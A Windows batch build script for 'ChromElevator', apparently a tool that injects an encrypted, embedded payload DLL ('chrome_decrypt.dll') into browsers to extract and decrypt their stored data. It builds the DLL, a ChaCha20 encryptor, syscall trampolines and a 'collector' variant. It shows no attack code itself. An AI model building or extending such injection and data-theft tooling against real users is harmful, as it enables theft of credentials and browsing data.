@echo off
setlocal enabledelayedexpansion

:: =============================================================================
:: ChromElevator Build System (x64 / ARM64 only)
:: =============================================================================

:: --- Architecture sanity check ---
if "%VSCMD_ARG_TGT_ARCH%"=="" (
    echo [!] This script must be run from a Visual Studio Developer Command Prompt.
    exit /b 1
)
if /i not "%VSCMD_ARG_TGT_ARCH%"=="x64" if /i not "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
    echo [!] This script requires an x64 or ARM64 command prompt. Current target: %VSCMD_ARG_TGT_ARCH%
    exit /b 1
)

:: Choose machine flags based on architecture
if /i "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
    set "ASM_CMD=armasm64.exe -nologo"
    set "ASM_SRC_FILE=syscall_trampoline_arm64.asm"
    set "LFLAGS_MACHINE=/MACHINE:ARM64"
) else (
    set "ASM_CMD=ml64.exe /nologo /c"
    set "ASM_SRC_FILE=syscall_trampoline_x64.asm"
    set "LFLAGS_MACHINE=/MACHINE:X64"
)

:: Directories
set "BUILD_DIR=build"
set "SRC_DIR=src"
set "LIBS_DIR=libs"
set "FINAL_EXE_NAME=chromelevator.exe"
set "COLLECTOR_EXE_NAME=collector.exe"
set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
set "COLLECTOR_PAYLOAD_DLL_NAME=collector_payload.dll"
set "ENCRYPTOR_EXE_NAME=encryptor.exe"
set "PAYLOAD_HEADER=payload_data.hpp"
set "COLLECTOR_PAYLOAD_HEADER=collector_payload_data.hpp"

:: Compiler Flags
set "CFLAGS_COMMON=/nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GL /GR- /Gw /Zc:threadSafeInit-"
set "CFLAGS_CPP=/std:c++17 /EHsc"
set "CFLAGS_SQLITE=/nologo /W0 /O1 /Os /MT /GS- /Gy /GL /DSQLITE_OMIT_LOAD_EXTENSION"

:: Linker Flags
set "LFLAGS_COMMON=/NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /INCREMENTAL:NO %LFLAGS_MACHINE%"
set "LFLAGS_MERGE=/MERGE:.rdata=.text"

:: Create build directory
if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"

:: Parse command line arguments
if "%1"=="clean" goto :clean
if "%1"=="build_encryptor_only" goto :build_encryptor
if "%1"=="build_target_only" goto :build_target

:full_build
call :compile_sqlite
if errorlevel 1 exit /b 1
call :compile_payload
if errorlevel 1 exit /b 1
call :compile_encryptor
if errorlevel 1 exit /b 1
call :encrypt_payload
if errorlevel 1 exit /b 1
call :compile_injector
if errorlevel 1 exit /b 1
call :compile_collector_payload
if errorlevel 1 exit /b 1
call :encrypt_collector_payload
if errorlevel 1 exit /b 1
call :compile_collector
if errorlevel 1 exit /b 1
goto :done

:clean
echo Cleaning build directory...
if exist "%BUILD_DIR%" rd /s /q "%BUILD_DIR%"
if exist "%FINAL_EXE_NAME%" del /q "%FINAL_EXE_NAME%"
if exist "%COLLECTOR_EXE_NAME%" del /q "%COLLECTOR_EXE_NAME%"
echo Clean complete.
goto :eof

:build_encryptor
call :compile_sqlite
call :compile_crypto
echo [1/2] Compiling Encryptor (standalone)...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /Fe"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    "%SRC_DIR%\sys\tools\encryptor.cpp" "%BUILD_DIR%\chacha20.obj" ^
    /link %LFLAGS_COMMON% bcrypt.lib
if errorlevel 1 exit /b 1
echo Encryptor built: %BUILD_DIR%\%ENCRYPTOR_EXE_NAME%
goto :eof

:build_target
call :compile_sqlite
call :compile_payload
call :compile_encryptor
call :encrypt_payload
call :compile_injector
goto :done

:: =============================================================================
:: SUBROUTINES
:: =============================================================================

:compile_sqlite
echo [1/5] Compiling SQLite3...
cl %CFLAGS_SQLITE% /c "%LIBS_DIR%\sqlite\sqlite3.c" /Fo"%BUILD_DIR%\sqlite3.obj" 2>nul
if errorlevel 1 exit /b 1
lib /NOLOGO /LTCG /OUT:"%BUILD_DIR%\sqlite3.lib" "%BUILD_DIR%\sqlite3.obj" >nul
if errorlevel 1 exit /b 1
goto :eof

:compile_crypto
if not exist "%BUILD_DIR%\chacha20.obj" (
    echo Compiling ChaCha20...
    cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\chacha20.cpp" /Fo"%BUILD_DIR%\chacha20.obj"
    if errorlevel 1 exit /b 1
)
goto :eof

:compile_payload
echo [2/5] Compiling Payload DLL...
call :compile_crypto
cl %CFLAGS_COMMON% /std:c++17 /EHs-c- /c "%SRC_DIR%\sys\bootstrap.cpp" /Fo"%BUILD_DIR%\bootstrap.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\payload_main.cpp" /Fo"%BUILD_DIR%\payload_main.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\com\elevator.cpp" /Fo"%BUILD_DIR%\elevator.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\pipe_client.cpp" /Fo"%BUILD_DIR%\pipe_client.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\data_extractor.cpp" /Fo"%BUILD_DIR%\data_extractor.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\aes_gcm.cpp" /Fo"%BUILD_DIR%\aes_gcm.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\handle_duplicator.cpp" /Fo"%BUILD_DIR%\handle_duplicator.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api_payload.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\extra_extractor.cpp" /Fo"%BUILD_DIR%\extra_extractor.obj"
if errorlevel 1 exit /b 1

:: Assemble syscall trampoline for payload DLL
%ASM_CMD% /Fo"%BUILD_DIR%\syscall_trampoline_payload.obj" "%SRC_DIR%\sys\%ASM_SRC_FILE%"
if errorlevel 1 exit /b 1

link %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" ^
    "%BUILD_DIR%\payload_main.obj" "%BUILD_DIR%\bootstrap.obj" "%BUILD_DIR%\elevator.obj" ^
    "%BUILD_DIR%\pipe_client.obj" "%BUILD_DIR%\data_extractor.obj" "%BUILD_DIR%\extra_extractor.obj" ^
    "%BUILD_DIR%\aes_gcm.obj" "%BUILD_DIR%\chacha20.obj" "%BUILD_DIR%\handle_duplicator.obj" ^
    "%BUILD_DIR%\internal_api_payload.obj" "%BUILD_DIR%\syscall_trampoline_payload.obj" ^
    "%BUILD_DIR%\sqlite3.lib" ^
    bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib crypt32.lib advapi32.lib kernel32.lib user32.lib libvcruntime.lib libucrt.lib ^
    wlanapi.lib rpcrt4.lib ncrypt.lib
if errorlevel 1 exit /b 1

if not exist "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" (
    echo [-] Payload DLL was not created!
    exit /b 1
)
goto :eof

:compile_encryptor
echo [3/5] Compiling Encryptor...
call :compile_crypto
cl %CFLAGS_COMMON% %CFLAGS_CPP% /Fe"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    "%SRC_DIR%\sys\tools\encryptor.cpp" "%BUILD_DIR%\chacha20.obj" ^
    /link %LFLAGS_COMMON% bcrypt.lib
if errorlevel 1 exit /b 1
goto :eof

:encrypt_payload
echo [4/5] Encrypting Payload + Generating Embedded Header...
if not exist "%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" (
    echo [-] Encryptor missing, cannot encrypt payload.
    exit /b 1
)
"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.enc" "%BUILD_DIR%\%PAYLOAD_HEADER%"
if errorlevel 1 (
    echo [-] Encryption failed. Exiting.
    exit /b 1
)
if not exist "%BUILD_DIR%\%PAYLOAD_HEADER%" (
    echo [-] Header file was not created.
    exit /b 1
)
goto :eof

:compile_injector
echo [5/5] Compiling Injector...
call :compile_crypto
%ASM_CMD% /Fo"%BUILD_DIR%\syscall_trampoline.obj" "%SRC_DIR%\sys\%ASM_SRC_FILE%"
if errorlevel 1 exit /b 1

cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
if errorlevel 1 exit /b 1
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
if errorlevel 1 exit /b 1

link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
    "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
    "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
    "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
    "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
    "%BUILD_DIR%\syscall_trampoline.obj" ^
    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
if errorlevel 1 exit /b 1

if not exist ".\%FINAL_EXE_NAME%" (
    echo [-] Injector EXE was not created!
    exit /b 1
)
goto :eof

:: =============================================================================
:: Collector payload DLL
:: =============================================================================

:compile_collector_payload
echo Compiling Collector Payload DLL...
if not exist "%BUILD_DIR%\pipe_client.obj" (
    echo [-] Required objects missing. Did :compile_payload run successfully?
    exit /b 1
)
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\collector\collector_payload.cpp" /Fo"%BUILD_DIR%\collector_payload.obj"
if errorlevel 1 exit /b 1

link %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\%COLLECTOR_PAYLOAD_DLL_NAME%" ^
    "%BUILD_DIR%\collector_payload.obj" ^
    "%BUILD_DIR%\pipe_client.obj" ^
    "%BUILD_DIR%\extra_extractor.obj" ^
    "%BUILD_DIR%\handle_duplicator.obj" ^
    "%BUILD_DIR%\aes_gcm.obj" ^
    "%BUILD_DIR%\chacha20.obj" ^
    "%BUILD_DIR%\internal_api_payload.obj" ^
    "%BUILD_DIR%\syscall_trampoline_payload.obj" ^
    "%BUILD_DIR%\sqlite3.lib" ^
    bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib crypt32.lib advapi32.lib kernel32.lib user32.lib libvcruntime.lib libucrt.lib ^
    wlanapi.lib rpcrt4.lib ncrypt.lib
if errorlevel 1 exit /b 1
goto :eof

:encrypt_collector_payload
echo Encrypting Collector Payload + Generating Embedded Header...
"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
    "%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_DLL_NAME%" ^
    "%CD%\%BUILD_DIR%\collector_payload.enc" ^
    "%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%"
if errorlevel 1 (
    echo [-] Collector payload encryption failed. Exiting.
    exit /b 1
)
if not exist "%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%" (
    echo [-] Header file missing after encryption.
    exit /b 1
)
goto :eof

:compile_collector
echo Compiling Collector injector...
cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%" /I"%CD%\%BUILD_DIR%" /FI"%CD%\%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%" ^
    /c "%SRC_DIR%\collector\collector_main.cpp" /Fo"%BUILD_DIR%\collector_main.obj"
if errorlevel 1 exit /b 1

link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%COLLECTOR_EXE_NAME%" ^
    "%BUILD_DIR%\collector_main.obj" ^
    "%BUILD_DIR%\browser_discovery.obj" ^
    "%BUILD_DIR%\browser_terminator.obj" ^
    "%BUILD_DIR%\process_manager.obj" ^
    "%BUILD_DIR%\pipe_server.obj" ^
    "%BUILD_DIR%\injector.obj" ^
    "%BUILD_DIR%\internal_api.obj" ^
    "%BUILD_DIR%\chacha20.obj" ^
    "%BUILD_DIR%\syscall_trampoline.obj" ^
    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
if errorlevel 1 exit /b 1
goto :eof

:done
echo.
echo =============================================================================
echo [+] Build Complete
if exist ".\%FINAL_EXE_NAME%" (
    echo     - %FINAL_EXE_NAME%
    for %%A in (".\%FINAL_EXE_NAME%") do echo     chromelevator.exe size: %%~zA bytes
) else (
    echo     [!] %FINAL_EXE_NAME% was not created.
)
if exist ".\%COLLECTOR_EXE_NAME%" (
    echo     - %COLLECTOR_EXE_NAME%
    for %%A in (".\%COLLECTOR_EXE_NAME%") do echo     collector.exe     size: %%~zA bytes
) else (
    echo     [!] %COLLECTOR_EXE_NAME% was not created.
)
echo =============================================================================
echo.
echo Cleaning up build artifacts...
del /q "%BUILD_DIR%\*.obj" 2>nul
del /q "%BUILD_DIR%\*.lib" 2>nul
del /q "%BUILD_DIR%\*.exp" 2>nul
del /q "%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" 2>nul
del /q "%BUILD_DIR%\%PAYLOAD_HEADER%" 2>nul
del /q "%BUILD_DIR%\%COLLECTOR_PAYLOAD_HEADER%" 2>nul
del /q "*.obj" 2>nul
echo [+] Cleaned intermediate object files
echo [+] Removed temporary artifacts
echo.
echo Retained build artifacts: %FINAL_EXE_NAME%, %COLLECTOR_EXE_NAME%, %BUILD_DIR%\%PAYLOAD_DLL_NAME%, %BUILD_DIR%\chrome_decrypt.enc, %BUILD_DIR%\%COLLECTOR_PAYLOAD_DLL_NAME%, %BUILD_DIR%\collector_payload.enc
goto :eof